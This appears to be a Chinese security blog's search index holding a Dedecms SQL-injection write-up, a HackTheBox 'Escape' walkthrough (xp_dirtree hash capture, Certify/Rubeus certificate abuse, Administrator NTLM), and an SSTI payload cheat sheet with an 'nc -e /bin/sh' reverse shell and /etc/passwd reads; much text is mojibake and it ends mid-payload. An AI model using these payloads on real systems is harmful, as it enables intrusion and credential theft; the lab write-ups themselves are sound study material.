<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Dedecms background SQL injection vulnerability</title>
    <url>/2023/02/28/Dedecms%20background%20SQL%20injection%20vulnerability/</url>
    <content><![CDATA[<h1 id="dedecms-background-sql-injection-vulnerabilitycve-2023-27733">Dedecms background SQL injection vulnerability(CVE-2023-27733)</h1>
<h2 id="recurrence-process">Recurrence Process</h2>
<p>Visit <code>/dede</code> to login to the website background.</p>
<p><img src="https://s2.loli.net/2023/02/28/g1a2hxkipK4LR7y.png"></p>
<p>An web-shell can be written in this page.</p>
<span id="more"></span>
<h2 id="code-audit">Code Audit</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‰§è¡ŒSQLè¯­å¥</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$dopost</span>==<span class="string">&quot;query&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">csrf_check</span>();</span><br><span class="line">    <span class="variable">$sqlquery</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">stripslashes</span>(<span class="variable">$sqlquery</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;#drop(.*)table#i&quot;</span>, <span class="variable">$sqlquery</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;#drop(.*)database#&quot;</span>, <span class="variable">$sqlquery</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;span style=&#x27;font-size:10pt&#x27;&gt;åˆ é™¤&#x27;æ•°æ®è¡¨&#x27;æˆ–&#x27;æ•°æ®åº“&#x27;çš„è¯­å¥ä¸å…è®¸åœ¨è¿™é‡Œæ‰§è¡Œã€‚&lt;/span&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è¿è¡ŒæŸ¥è¯¢è¯­å¥</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;#^select #i&quot;</span>, <span class="variable">$sqlquery</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">SetQuery</span>(<span class="variable">$sqlquery</span>);</span><br><span class="line">        <span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">Execute</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">GetTotalRow</span>()&lt;=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;è¿è¡ŒSQLï¼š<span class="subst">&#123;$sqlquery&#125;</span>ï¼Œæ— è¿”å›è®°å½•ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;è¿è¡ŒSQLï¼š<span class="subst">&#123;$sqlquery&#125;</span>ï¼Œå…±æœ‰&quot;</span>.<span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">GetTotalRow</span>().<span class="string">&quot;æ¡è®°å½•ï¼Œæœ€å¤§è¿”å›100æ¡ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$j</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">GetArray</span>()) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$j</span>++;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$j</span> &gt; <span class="number">100</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr size=1 width=&#x27;100%&#x27;/&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;è®°å½•ï¼š<span class="subst">$j</span>&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr size=1 width=&#x27;100%&#x27;/&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$row</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;font color=&#x27;red&#x27;&gt;<span class="subst">&#123;$k&#125;</span>ï¼š&lt;/font&gt;<span class="subst">&#123;$v&#125;</span>&lt;br/&gt;\r\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$querytype</span>==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//æ™®é€šçš„SQLè¯­å¥</span></span><br><span class="line">        <span class="variable">$sqlquery</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$sqlquery</span>);</span><br><span class="line">        <span class="variable">$sqls</span> = <span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;#;[ \t]&#123;0,&#125;\n#&quot;</span>,<span class="variable">$sqlquery</span>);</span><br><span class="line">        <span class="variable">$nerrCode</span> = <span class="string">&quot;&quot;</span>; <span class="variable">$i</span>=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$sqls</span> <span class="keyword">as</span> <span class="variable">$q</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$q</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$q</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$q</span>==<span class="string">&quot;&quot;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">ExecuteNoneQuery</span>(<span class="variable">$q</span>);</span><br><span class="line">            <span class="variable">$errCode</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">GetError</span>());</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$errCode</span>==<span class="string">&quot;&quot;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$i</span>++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$nerrCode</span> .= <span class="string">&quot;æ‰§è¡Œï¼š &lt;font color=&#x27;blue&#x27;&gt;<span class="subst">$q</span>&lt;/font&gt; å‡ºé”™ï¼Œé”™è¯¯æç¤ºï¼š&lt;font color=&#x27;red&#x27;&gt;&quot;</span>.<span class="variable">$errCode</span>.<span class="string">&quot;&lt;/font&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æˆåŠŸæ‰§è¡Œ<span class="subst">&#123;$i&#125;</span>ä¸ªSQLè¯­å¥ï¼&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$nerrCode</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">ExecuteNoneQuery</span>(<span class="variable">$sqlquery</span>);</span><br><span class="line">        <span class="variable">$nerrCode</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">GetError</span>());</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æˆåŠŸæ‰§è¡Œ1ä¸ªSQLè¯­å¥ï¼&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$nerrCode</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The sql statement only prohibits database deletion, and does not prohibit shell writing through the SQL statement.</p>
<p><img src="https://s2.loli.net/2023/02/28/uqMaB28jVwNGU1O.png"></p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-escape</title>
    <url>/2023/06/13/HTB-escape/</url>
    <content><![CDATA[<h1 id="htb-escape">HTB-escape</h1>
<p>ç¬¬ä¸€ä¸ªwindowsé¶æœºï¼Œè®°å½•ä¸€ä¸‹</p>
<span id="more"></span>
<h2 id="ä¿¡æ¯æœé›†">ä¿¡æ¯æœé›†</h2>
<p>nmapæ‰«ä¸€ä¸‹ç«¯å£</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Nmap 7.94 scan initiated Sun Jun 11 20:21:13 2023 as: nmap --min-rate 10000 -p- -Pn -oA nmap/ports 10.10.11.202</span><br><span class="line">Nmap scan report for 10.10.11.202</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 65517 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">1433/tcp  open  ms-sql-s</span><br><span class="line">3268/tcp  open  globalcatLDAP</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49687/tcp open  unknown</span><br><span class="line">49701/tcp open  unknown</span><br><span class="line">49709/tcp open  unknown</span><br><span class="line">52716/tcp open  unknown</span><br><span class="line"></span><br><span class="line"># Nmap done at Sun Jun 11 20:23:00 2023 -- 1 IP address (1 host up) scanned in 107.14 seconds</span><br></pre></td></tr></table></figure>
<p>å¾ˆæ˜æ˜¾çš„åŸŸæ§æœåŠ¡å™¨ã€‚ç«¯å£æœ‰ç‚¹å¤šï¼Œè®¾ä¸€ä¸ªå˜é‡æ¥æ”¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ports=$(grep open nmap/ports.nmap | awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; | paste -sd &#x27;,&#x27;)</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Nmap 7.94 scan initiated Sun Jun 11 20:24:02 2023 as: nmap -sT -sC -sV -O -p53,88,135,139,389,445,464,593,636,1433,3268,5985,9389,49667,49687,49701,49709,52716 -oA nmap/detail 10.10.11.202</span></span><br><span class="line">Nmap scan report for 10.10.11.202                                                                     </span><br><span class="line">Host is up (0.29s latency).                                                                                                                                                                                 </span><br><span class="line">                                                   </span><br><span class="line">PORT      STATE SERVICE       VERSION                                                                 </span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-11 20:23:57Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC                </span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn          </span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb</span><br><span class="line">| Not valid before: 2022-11-18T21:20:35                                                               </span><br><span class="line">|_Not valid after:  2023-11-18T21:20:35                                                               </span><br><span class="line">|_ssl-date: 2023-06-11T20:25:40+00:00; +7h59m47s from scanner time.</span><br><span class="line">445/tcp   open  microsoft-ds?                                                                         </span><br><span class="line">464/tcp   open  kpasswd5?                                                                             </span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                    </span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc.sequel.htb                                                         </span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb</span><br><span class="line">| Not valid before: 2022-11-18T21:20:35                                                               </span><br><span class="line">|_Not valid after:  2023-11-18T21:20:35                                                               </span><br><span class="line">|_ssl-date: 2023-06-11T20:25:41+00:00; +7h59m46s from scanner time.</span><br><span class="line">1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM</span><br><span class="line">| ms-sql-info:        </span><br><span class="line">|   10.10.11.202:1433: </span><br><span class="line">|     Version:                            </span><br><span class="line">|       name: Microsoft SQL Server 2019 RTM                                                           </span><br><span class="line">|       number: 15.00.2000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2019</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|_    TCP port: 1433                                                                                  </span><br><span class="line">| ms-sql-ntlm-info:                                                                                   </span><br><span class="line">|   10.10.11.202:1433: </span><br><span class="line">|     Target_Name: sequel       </span><br><span class="line">|     NetBIOS_Domain_Name: sequel</span><br><span class="line">|     Target_Name: sequel                                                                                          </span><br><span class="line">|     NetBIOS_Domain_Name: sequel</span><br><span class="line">|     NetBIOS_Computer_Name: DC</span><br><span class="line">|     DNS_Domain_Name: sequel.htb</span><br><span class="line">|     DNS_Computer_Name: dc.sequel.htb             </span><br><span class="line">|     DNS_Tree_Name: sequel.htb                                                                       </span><br><span class="line">|_    Product_Version: 10.0.17763                  </span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback                                              </span><br><span class="line">| Not valid before: 2023-06-10T02:13:41</span><br><span class="line">|_Not valid after:  2053-06-10T02:13:41                                                                                                                                                                     </span><br><span class="line">|_ssl-date: 2023-06-11T20:25:39+00:00; +7h59m47s from scanner time.                                   </span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)                                                                                 </span><br><span class="line">| ssl-cert: Subject: commonName=dc.sequel.htb      </span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb         </span><br><span class="line">| Not valid before: 2022-11-18T21:20:35      </span><br><span class="line">|_Not valid after:  2023-11-18T21:20:35                                                               </span><br><span class="line">|_ssl-date: 2023-06-11T20:25:40+00:00; +7h59m46s from scanner time.</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                                                                 </span><br><span class="line">|_http-title: Not Found                      </span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing                                                    </span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC                                                   </span><br><span class="line">49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                     </span><br><span class="line">49701/tcp open  msrpc         Microsoft Windows RPC                </span><br><span class="line">49709/tcp open  msrpc         Microsoft Windows RPC                                                   </span><br><span class="line">52716/tcp open  msrpc         Microsoft Windows RPC                                                   </span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose                                                                                                                                                                                </span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2019 (86%)                                                 </span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2019 (86%)                                   </span><br><span class="line">No exact OS matches for host (test conditions non-ideal).                                             </span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows                                    </span><br><span class="line">                                                                                                      </span><br><span class="line">Host script results:                                                                                  </span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1:             </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 7h59m46s, deviation: 0s, median: 7h59m45s                                         </span><br><span class="line">| smb2-time:                 </span><br><span class="line">|   date: 2023-06-11T20:24:58             </span><br><span class="line">|_  start_date: N/A            </span><br><span class="line">                                                   </span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Nmap <span class="keyword">done</span> at Sun Jun 11 20:25:58 2023 -- 1 IP address (1 host up) scanned <span class="keyword">in</span> 116.13 seconds</span> </span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°æœ‰dc.sequel.htbå’Œsequel.htbï¼ŒåŠ åˆ°hostsæ–‡ä»¶ä¸­</p>
<p>æ¼æ´è„šæœ¬æ‰«æ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Nmap 7.94 scan initiated Sun Jun 11 20:24:43 2023 as: nmap --script=vuln -p53,88,135,139,389,445,464,593,636,1433,3268,5985,9389,49667,49687,49701,49709,52716 -oA nmap/vuln 10.10.11.202</span><br><span class="line">Nmap scan report for 10.10.11.202</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">1433/tcp  open  ms-sql-s</span><br><span class="line">|_tls-ticketbleed: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">3268/tcp  open  globalcatLDAP</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49687/tcp open  unknown</span><br><span class="line">49701/tcp open  unknown</span><br><span class="line">49709/tcp open  unknown</span><br><span class="line">52716/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR</span><br><span class="line">|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR</span><br><span class="line">|_smb-vuln-ms10-054: false</span><br><span class="line"></span><br><span class="line"># Nmap done at Sun Jun 11 20:26:58 2023 -- 1 IP address (1 host up) scanned in 134.59 seconds</span><br></pre></td></tr></table></figure>
<h2 id="ä¸€äº›å°è¯•">ä¸€äº›å°è¯•</h2>
<p>å¼€äº†rpcï¼Œå°è¯•çˆ†ä¸€ä¸‹uuidå’Œæ“ä½œæ•°</p>
<p><img src="https://s2.loli.net/2023/06/13/ByCbcAmxUE5ie2t.png"></p>
<p>å¤±è´¥ï¼Œå¼€äº†sambaå°è¯•ä¸€ä¸‹åŒ¿åç™»å½•</p>
<p><img src="https://s2.loli.net/2023/06/13/ExOBP5khLS2GlUt.png"></p>
<p>æœ‰ä¸€ä¸ªPDFï¼Œé‡Œé¢å†™äº†mssqlçš„å…¬ç”¨è´¦æˆ·å’Œå¯†ç </p>
<p><img src="https://s2.loli.net/2023/06/13/fsK9l3DP6JNYZTb.png"></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯é•¿è¾¾ä¸¤ä¸ªå°æ—¶è¯•å›¾åœ¨kalié‡Œé¢è¿æ¥mssql</p>
<p><img src="https://s2.loli.net/2023/06/13/EizZkYhRHmSeWNw.png"></p>
<p>åæ¥å‘ç°å¾®è½¯å®˜æ–¹è¯´çš„æ”¯æŒlinuxç³»ç»Ÿé‡Œé¢æ²¡æœ‰KaliğŸ¥²</p>
<p><img src="https://s2.loli.net/2023/06/13/nI6gqaik8cQdvzE.png"></p>
<p>dockerä¹Ÿç”¨ä¸äº†</p>
<p>æœ€åå‘ç°Kaliè‡ªå¸¦impacketåŒ…</p>
<p><img src="https://s2.loli.net/2023/06/13/EyHo2ZmIaV56uW4.png"></p>
<p>ç™»è¿›å»ä»¥åå‘ç°xp_cmdshellè¢«banäº†ï¼Œæ•°æ®åº“é‡Œé¢ä¹Ÿæ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯</p>
<p>åæ¥å‘ç°äº†<a href="https://blog.csdn.net/qq_60115503/article/details/124120094">æµ…æmssqlæ¸—é€ä¹‹XP_dirtree LLMNR/NBT-NSæ¬ºéª—æ”»å‡»_QiaN_djxçš„åšå®¢-CSDNåšå®¢</a></p>
<p>è·Ÿç€æ‰“å°±å¯ä»¥å¾—åˆ°ç”¨æˆ·å“ˆå¸Œï¼ŒJohnç›´æ¥å¯ä»¥è·‘å‡ºæ¥</p>
<p><img src="https://s2.loli.net/2023/06/13/agntNA2bZehRT1Y.png"></p>
<h2 id="ä¿¡æ¯æœé›†-1">ä¿¡æ¯æœé›†</h2>
<p>å¯ä»¥çœ‹åˆ°æœ‰3ä¸ªç”¨æˆ·ï¼Œæ¥ä¸‹æ¥åº”è¯¥å°±æ˜¯è¦ç§»åŠ¨åˆ°Ryan.Cooperäº†</p>
<p>åœ¨C:\sqlserver\logsé‡Œé¢æœ‰ä¸€ä»½æ—¥å¿—å¤‡ä»½æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°Ryan.Cooperçš„ç”¨æˆ·åå¯†ç ã€‚</p>
<p><img src="https://s2.loli.net/2023/06/13/hlCSYqcp9yHWM7B.png"></p>
<p>åœ¨desktopé‡Œé¢æ‰¾åˆ°äº†userflag</p>
<p><img src="https://s2.loli.net/2023/06/13/2PE5Tq1nGukcRgZ.png"></p>
<h2 id="ææƒ">ææƒ</h2>
<p>æ‰¾windowsææƒçš„æ—¶å€™æ‰¾åˆ°äº†è¿™ä¸ª<a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation">AD CS Domain Escalation - HackTricks</a></p>
<p>æ‰¾äº†ä¸€ä¸ªxdçš„exeé›†åˆåŒ…<a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">r3motecontrol/Ghostpack-CompiledBinaries: Compiled Binaries for Ghostpack (.NET v4.0) (github.com)</a></p>
<p><img src="https://s2.loli.net/2023/06/13/8IvxrKgzoQC2L6Y.png"></p>
<p>å¾®è½¯NB</p>
<p>windowsç”¨Invoke-Webrequestä¸‹æ–‡ä»¶</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Invoke-WebRequest &quot;http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">173</span>:<span class="number">1234</span>/Certify.exe &quot; -OutFile &quot;C:\Users\Ryan.Cooper\Documents\Certify.exe&quot;</span><br></pre></td></tr></table></figure>
<p>æŠŠå¾—åˆ°çš„keyå’Œpemæ”¾Kalié‡Œé¢ç”Ÿæˆpfxè¯ä¹¦ï¼Œå‘½ä»¤è·‘Certify.exeçš„æœ€åç»™äº†</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl pkcs12 -in cert.pem -inkey private.key  -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</span><br></pre></td></tr></table></figure>
<p>æœ€åæŠŠRubuså’Œpfxä¼ ä¸Šå»ï¼Œå¾—åˆ°administratorçš„ntlm</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials </span><br></pre></td></tr></table></figure>
<p>ç”Ÿæˆè¯ä¹¦çš„æ—¶å€™ç©ºå¯†ç å°±ä¸ç”¨åŠ passwordå‚æ•°</p>
<p><img src="https://s2.loli.net/2023/06/13/fxwF2VGkBpiP9YZ.png"></p>
<p>åœ¨desktopé‡Œæ‰¾åˆ°rootflagğŸ˜­</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTIæ¨¡ç‰ˆæ³¨å…¥</title>
    <url>/2022/07/07/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="ssti">SSTI</h1>
<h2 id="sstiåˆ¤æ–­">SSTIåˆ¤æ–­</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="number">7</span>+<span class="number">7</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>è¾“å…¥ä¼šå›æ˜¾ï¼Œåˆ¤æ–­å›æ˜¾å€¼ã€‚</p>
<span id="more"></span>
<h2 id="å¸¸ç”¨çš„æ¨¡ç‰ˆå¼•æ“">å¸¸ç”¨çš„æ¨¡ç‰ˆå¼•æ“</h2>
<h3 id="smarty">smarty</h3>
<p>Smartyæ”¯æŒä½¿ç”¨{php}{/php}æ ‡ç­¾æ¥æ‰§è¡Œè¢«åŒ…è£¹å…¶ä¸­çš„phpæŒ‡ä»¤ï¼Œä½†æ˜¯åœ¨Smarty 3.1ï¼Œ{php}ä»…åœ¨SmartyBCä¸­å¯ç”¨ã€‚</p>
<p>{literal}å¯ä»¥è®©ä¸€ä¸ªæ¨¡æ¿åŒºåŸŸçš„å­—ç¬¦åŸæ ·è¾“å‡ºã€‚è¿™ç»å¸¸ç”¨äºä¿æŠ¤é¡µé¢ä¸Šçš„Javascriptæˆ–cssæ ·å¼è¡¨ï¼Œé¿å…å› ä¸ºSmartyçš„å®šç•Œç¬¦è€Œé”™è¢«è§£æã€‚</p>
<p>åœ¨PHP5å³å¯ä½¿ç”¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="title function_ invoke__">phpinfo</span>();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>é™æ€æ–¹æ³•ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="built_in">self</span>::<span class="title function_ invoke__">getStreamVariable</span>(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨3.1.30çš„Smartyç‰ˆæœ¬ä¸­å®˜æ–¹å·²ç»æŠŠè¯¥é™æ€æ–¹æ³•åˆ é™¤ã€‚åˆ©ç”¨ Smarty_Internal_Write_File ç±»çš„writeFileæ–¹æ³•æ¥å†™shellä¹Ÿç”±äºåŒæ ·çš„åŸå› æ— æ³•ä½¿ç”¨ã€‚</p>
<p>ifå¤´ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">phpinfo</span>()&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure>
<h3 id="twig">twig</h3>
<p>ç›¸æ¯”äº Smarty ,Twig æ— æ³•è°ƒç”¨é™æ€æ–¹æ³•ï¼Œå¹¶ä¸”æ‰€æœ‰å‡½æ•°çš„è¿”å›å€¼éƒ½è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨ <code>self::</code> è°ƒç”¨é™æ€å˜é‡äº†ã€‚</p>
49
<p>ä¼šè¾“å‡º49.</p>
<p>payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.<span class="title function_ invoke__">registerUndefinedFilterCallback</span>(<span class="string">&quot;exec&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.<span class="title function_ invoke__">getFilter</span>(<span class="string">&quot;cat /flag&quot;</span>)&#125;&#125; <span class="comment"># æ‰§è¡Œä»»æ„æŒ‡ä»¤</span></span><br></pre></td></tr></table></figure>
<h3 id="flaskjinja2">flask/jinja2</h3>
49
<p>ä¼šè¾“å‡º7777777.</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/tmp/evil&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;from os import system%0aSHELL = system&#x27;</span>) &#125;&#125;</span><br><span class="line">//å†™æ–‡ä»¶</span><br><span class="line">&#123;&#123; config.from_pyfile(<span class="string">&#x27;/tmp/evil&#x27;</span>) &#125;&#125;</span><br><span class="line">//åŠ è½½system</span><br><span class="line">&#123;&#123; config[<span class="string">&#x27;SHELL&#x27;</span>](<span class="string">&#x27;nc xxxx xx -e /bin/sh&#x27;</span>) &#125;&#125;</span><br><span class="line">//æ‰§è¡Œå‘½ä»¤åå¼¹SHELL</span><br><span class="line">payload:?name=&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; 